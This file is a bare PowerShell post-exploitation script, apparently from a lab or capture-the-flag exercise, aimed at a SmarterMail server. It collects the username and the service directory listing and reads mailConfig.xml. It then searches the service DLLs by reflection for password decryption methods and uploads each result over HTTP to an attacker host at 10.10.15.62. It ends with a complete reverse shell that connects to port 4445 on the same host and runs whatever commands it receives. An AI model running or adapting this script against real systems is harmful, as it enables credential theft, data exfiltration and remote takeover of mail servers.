$ErrorActionPreference='Continue'
function Post($name,$text){
  try{ $wc=New-Object Net.WebClient; $wc.Headers.Add('Content-Type','text/plain'); $wc.UploadData("http://10.10.15.62:8000/upload/$name",[Text.Encoding]::UTF8.GetBytes($text))|Out-Null }catch{}
}
$log=@("whoami=$(whoami)")
$svc='C:\Program Files (x86)\SmarterTools\SmarterMail\Service'
try{ Get-ChildItem $svc | % { $log+="F $($_.Name) $($_.Length)" } }catch{ $log+="listerr $_" }
try{ $log+="mailConfig=$(Get-Content "$svc\mailConfig.xml" -Raw -ErrorAction Stop)" }catch{ $log+="mc $_" }
# list Settings next to process
try{ Get-ChildItem (Get-Location) | % { $log+="CWD $($_.Name)" } }catch{}
# Find Decrypt via Select-String on DLLs with strings is heavy - use reflection limited
$dlls=Get-ChildItem $svc -Filter *.dll -ErrorAction SilentlyContinue
$log+="dlls=$($dlls.Count)"
foreach($d in $dlls){ $log+="D $($d.Name)" }
Post 'svc_list.txt' ($log -join "`n")

# reflection on each service dll for password
$found=@()
foreach($d in $dlls){
  try{
    $a=[Reflection.Assembly]::LoadFrom($d.FullName)
    foreach($t in $a.GetTypes()){
      foreach($m in $t.GetMethods([Reflection.BindingFlags]'Public,NonPublic,Static')){
        if($m.Name -match 'Decrypt|DecodePassword|EncryptPassword|Password'){
          $ps=($m.GetParameters()|%{$_.ParameterType.Name}) -join ','
          $found+="$($t.FullName)::$($m.Name)($ps) file=$($d.Name)"
        }
      }
    }
  }catch{ $found+="loadfail $($d.Name): $($_.Exception.GetType().Name)" }
}
Post 'reflect_methods.txt' ($found -join "`n")

# try invoke common names
$targets=@(
  @{asm='SmarterMail.Common.dll'; type='';},
  @{asm='MailService.Common.dll'; type=''}
)
# interactive shell
$c=New-Object Net.Sockets.TCPClient('10.10.15.62',4445);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length);$s.Flush()}
